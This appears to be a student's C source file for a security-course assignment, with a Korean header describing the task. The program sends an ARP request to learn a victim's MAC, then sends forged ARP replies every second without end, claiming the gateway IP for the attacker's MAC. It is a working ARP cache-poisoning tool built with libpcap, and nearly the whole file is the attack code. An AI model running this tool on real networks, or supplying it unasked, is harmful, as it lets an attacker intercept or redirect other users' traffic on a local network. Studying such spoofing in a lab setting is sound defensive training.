/*

[리포트]
sender(victim)의 arp table을 변조하라.

[프로그램]
send_arp <interface> <sender ip> <target ip>
ex : send_arp wlan0 192.168.10.2 192.168.10.1

sender ip는 victim ip라고도 함.
target ip는 일반적으로 gateway임.

[학습]
구글링을 통해서 arp header의 구조(각 필드의 의미)를 익힌다.

pcap_sendpacket 함수를 이용해서 user defined buffer를 packet으로 전송하는 방법을 익힌다.

attacker(자신) mac 정보를 알아 내는 방법은 구글링을 통해서 코드를 베껴 와도 된다.

arp infection packet 구성에 필요한 sender mac 정보는 프로그램 레벨에서 자동으로(정상적인 arp request를 날리고 그 arp reply를 받아서) 알아 오도록 코딩한다.

최종적으로 상대방을 감염시킬 수 있도록 eth header와 arp header를 구성하여 arp infection packet을 보내고 sender에서 target arp table이 변조되는 것을 확인해 본다.

[리포트 제목]
char track[] = "개발"; // "취약점", "컨설팅", "포렌식"
char name[] = "홍길동";
printf("[bob7][%s]send_arp[%s]", track, name);
*/
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <errno.h>
enum { ARGV_CMD, ARGV_INTERFACE };
#define ether_ARP 0x0806 
int main(int argc,const char* argv[]){ 

	char track[] = "포렌식"; // "취약점", "컨설팅", "포렌식"
	char name[] = "김영웅";
	printf("[bob7][%s]send_arp[%s]", track, name);


    int sock;
    struct ifreq ifr;
    //char *mac = NULL;
 
    if (argc < 2){
        fprintf(stderr,"usage: arp_test <interface> <victim_ip> <target_ip>   \n");
        exit(1);
    }
    const char* if_name=argv[1];
    const char* victim_ip_string=argv[2];
    const char* target_ip_string=argv[3];

    //Get MAC Address
    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, argv[ARGV_INTERFACE]);
 
    int fd=socket(AF_UNIX, SOCK_DGRAM, 0);
 
    if((sock=socket(AF_UNIX, SOCK_DGRAM, 0))<0){
        perror("socket ");
        return 1;
    }
 
    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
        perror("ioctl ");
        return 1;
    }
    
//    mac = ifr.ifr_hwaddr.sa_data;
 //   printf("%s: %02x:%02x:%02x:%02x:%02x:%02x\n", ifr.ifr_name, mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
    close(sock);

////I copied the above Codes.

    struct ether_header eth_header;
    memset(eth_header.ether_dhost, 0xff, sizeof(eth_header.ether_dhost));
    const unsigned char* source_mac_addr=(unsigned char*)ifr.ifr_hwaddr.sa_data;
    memcpy(eth_header.ether_shost,source_mac_addr,sizeof(eth_header.ether_shost));

//    memcpy(eth_header.ether_shost, mac, sizeof(eth_header.ether_shost));
    eth_header.ether_type = ntohs(ether_ARP);
//    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", eth_header.ether_shost[0], eth_header.ether_shost[1], eth_header.ether_shost[2], eth_header.ether_shost[3], eth_header.ether_shost[4], eth_header.ether_shost[5]);

    
    size_t if_name_len=strlen(if_name);
    if (if_name_len<sizeof(ifr.ifr_name)) {
        memcpy(ifr.ifr_name,if_name,if_name_len);
        ifr.ifr_name[if_name_len]=0;
    } else {
        fprintf(stderr,"interface name is too long");
        exit(1);
    }
    
    int fp=socket(AF_INET,SOCK_DGRAM,0);
    if (fp==-1) {
        perror(0);
        exit(1);
    }

    // Obtain the source IP address, copy into ARP request
    if (ioctl(fp,SIOCGIFADDR,&ifr)==-1) {
        perror(0);
        close(fp);
        exit(1);
    }

    struct sockaddr_in* source_ip_addr = (struct sockaddr_in*)&ifr.ifr_addr;
    // Convert victim IP address from string, copy into ARP request.
    struct in_addr victim_ip_addr={0};
    if (!inet_aton(victim_ip_string,&victim_ip_addr)) {
       fprintf(stderr,"%s is not a valid IP address",victim_ip_string);
       exit(1);
    }

    struct ether_arp req_header;
    req_header.arp_hrd = htons(0x0001);
    req_header.arp_pro = htons(0x0800);
    req_header.arp_hln = 0x6;
    req_header.arp_pln = 0x4;
    req_header.arp_op = htons(0x0001);
    memcpy(&req_header.arp_sha, source_mac_addr, sizeof(req_header.arp_sha));
    memcpy(&req_header.arp_spa,&source_ip_addr->sin_addr.s_addr,sizeof(req_header.arp_spa));
    memset(req_header.arp_tha, 0x00, sizeof(req_header.arp_tha));
    memcpy(&req_header.arp_tpa,&victim_ip_addr.s_addr,sizeof(req_header.arp_tpa));
    //printf("%d.%d.%d.%d",req_header.arp_tpa[0],req_header.arp_tpa[1],req_header.arp_tpa[2],req_header.arp_tpa[3]);

    unsigned char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)];
    memcpy(frame,&eth_header,sizeof(struct ether_header));
    memcpy(frame+sizeof(struct ether_header),&req_header,sizeof(struct ether_arp));

    char pcap_errbuf[PCAP_ERRBUF_SIZE];
    pcap_errbuf[0]='\0';
    pcap_t* handle=pcap_open_live(if_name,BUFSIZ,1,1000,pcap_errbuf);
    if (pcap_errbuf[0]!='\0') {
        fprintf(stderr,"%s\n",pcap_errbuf);
    }
    if (!handle) {
        exit(1);
    }

    if(pcap_sendpacket(handle, frame, sizeof(frame))==-1){
        pcap_perror(handle,0);
        pcap_close(handle);
        exit(1);
    }
  /*  
    struct pcap_pkthdr* header;         // The header that pcap gives us
    const u_char* packet;               // The actual packet
    int res = pcap_next_ex(handle, &header, &packet);
    
    struct ether_header* rec_eth;
    rec_eth = (struct ether_header*)(packet);

    struct ether_arp* rec_arp;
    rec_arp = (struct ether_arp*)(packet+sizeof(ether_header));
    */
    //printf("%02x:%02x:%02x:%02x:%02x:%02x",rec_eth->ether_shost[0],rec_eth->ether_shost[1],rec_eth->ether_shost[2],rec_eth->ether_shost[3],rec_eth->ether_shost[4],rec_eth->ether_shost[5]);
    //printf("%d.%d.%d.%d\n",rec_arp->arp_spa[0],rec_arp->arp_spa[1],rec_arp->arp_spa[2],rec_arp->arp_spa[3]);

//Spoofing
    //char * temp;
    //memcpy()
    //printf("%04x\n", rec_arp->arp_spa);
    //printf("%s\n", victim_ip_string);


    //while(memcmp(rec_arp->arp_spa, &victim_ip_addr.s_addr, sizeof(rec_arp->arp_spa))!=0){
    while(1){

    	struct pcap_pkthdr* header;         // The header that pcap gives us
	    const u_char* packet;               // The actual packet
    	int res = pcap_next_ex(handle, &header, &packet);
    	if (res == 0) continue;
    	if (res == -1 || res == -2) break;

    	struct ether_header* rec_eth;
    	rec_eth = (struct ether_header*)(packet);
    	
    	if (rec_eth->ether_type == htons(ether_ARP)){

		    struct ether_arp* rec_arp;
		    rec_arp = (struct ether_arp*)(packet+sizeof(ether_header));
		    if (memcmp(rec_arp->arp_spa, &victim_ip_addr.s_addr, sizeof(rec_arp->arp_spa))==0){
			    printf("%d.%d.%d.%d\n",rec_arp->arp_spa[0],rec_arp->arp_spa[1],rec_arp->arp_spa[2],rec_arp->arp_spa[3]);
				printf("receiving packet is Done!\n");
				memcpy(eth_header.ether_dhost, rec_arp->arp_sha, sizeof(eth_header.ether_dhost));
				memcpy(req_header.arp_tha, rec_arp->arp_sha, sizeof(req_header.arp_tha));

		    	break;
		    }
    	}
	
	}
	//printf("receiving packet is Done!\n");
    req_header.arp_op = htons(0x0002);
	//memcpy(eth_header.ether_dhost, rec_arp->arp_sha, sizeof(eth_header.ether_dhost));
	//memcpy(req_header.arp_tha, rec_arp->arp_sha, sizeof(req_header.arp_tha));

	struct in_addr target_ip_addr={0};
	if (!inet_aton(target_ip_string,&target_ip_addr)) {
	    fprintf(stderr,"%s is not a valid IP address",target_ip_string);
	    exit(1);
	}
	memcpy(req_header.arp_spa, &target_ip_addr, sizeof(req_header.arp_spa));
	unsigned char spoof[sizeof(ether_header)+sizeof(ether_arp)];
	memcpy(spoof, &eth_header,sizeof(struct ether_header));
	memcpy(spoof+sizeof(ether_header), &req_header, sizeof(struct ether_arp));

    while(1){
	if(pcap_sendpacket(handle, spoof, sizeof(spoof))==-1){
        pcap_perror(handle,0);
        pcap_close(handle);
        exit(1);
    }
	printf("Sending Packet...\n");
	sleep(1);
    }
    pcap_close(handle);


    return 0;
 }

